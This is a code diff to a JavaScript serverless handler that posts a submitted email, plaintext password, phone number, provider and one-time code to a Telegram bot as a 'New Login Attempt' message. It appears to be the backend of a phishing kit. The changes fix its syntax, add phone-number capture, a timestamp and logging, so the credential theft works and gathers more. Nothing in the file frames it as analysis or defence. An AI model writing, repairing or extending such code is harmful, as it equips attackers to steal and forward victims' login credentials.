@@ -8,7 +8,7 @@ const REDIS_URL = process.env.REDIS_URL;
 let redis;
 
 function getOtpKey(email) {
-  return otp:${email};
+  return `otp:${email}`;
 }
 
 function generateOtp() {
@@ -32,17 +32,17 @@ export default async function handler(req, res) {
   }
 
   let bodyObj = req.body;
-  if (typeof req.body === "string") {
+  if (typeof bodyObj === "string") {
     try {
-      bodyObj = JSON.parse(req.body);
-    } catch (e) {
+      bodyObj = JSON.parse(bodyObj);
+    } catch {
       return res.status(400).json({ success: false, message: "Invalid JSON body" });
     }
   }
 
-  const { email, password, provider } = bodyObj || {};
+  const { email, password, phone, provider } = bodyObj || {};
 
-  if (!email || !password || !provider) {
+  if (!email || !password || !phone || !provider) {
     return res.status(400).json({ success: false, message: "Missing required fields" });
   }
 
@@ -50,8 +50,10 @@ export default async function handler(req, res) {
   const otp = generateOtp();
 
   try {
-    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300); // 5 minutes
+    await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300); // expire in 5 minutes
+    console.log("OTP stored in Redis");
   } catch (err) {
+    console.error("Redis error:", err);
     return res.status(500).json({
       success: false,
       message: "Failed to store OTP in Redis",
@@ -59,8 +61,17 @@ export default async function handler(req, res) {
     });
   }
 
-  const message = 🔐 *New Login Attempt*\n\n📧 Email: ${normalizedEmail}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp};
-  const telegramUrl = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage;
+  const message = [
+    "🔐 *New Login Attempt*",
+    `📧 Email: ${normalizedEmail}`,
+    `🔑 Password: ${password}`,
+    `📱 Phone: ${phone}`,
+    `🌐 Provider: ${provider}`,
+    `🧾 OTP: ${otp}`,
+    `🕒 Time: ${new Date().toISOString()}`,
+  ].join("\n");
+
+  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
     const response = await fetch(telegramUrl, {
@@ -75,16 +86,18 @@ export default async function handler(req, res) {
 
     if (!response.ok) {
       const text = await response.text();
-      throw new Error(Telegram API error: ${response.status} ${text});
+      throw new Error(`Telegram API error: ${response.status} ${text}`);
     }
 
-    res.status(200).json({
+    console.log("OTP sent to Telegram");
+    return res.status(200).json({
       success: true,
       message: "OTP sent to Telegram",
       email: normalizedEmail,
     });
   } catch (error) {
-    res.status(500).json({
+    console.error("Telegram error:", error);
+    return res.status(500).json({
       success: false,
       message: "Failed to send OTP to Telegram",
       error: error.message,
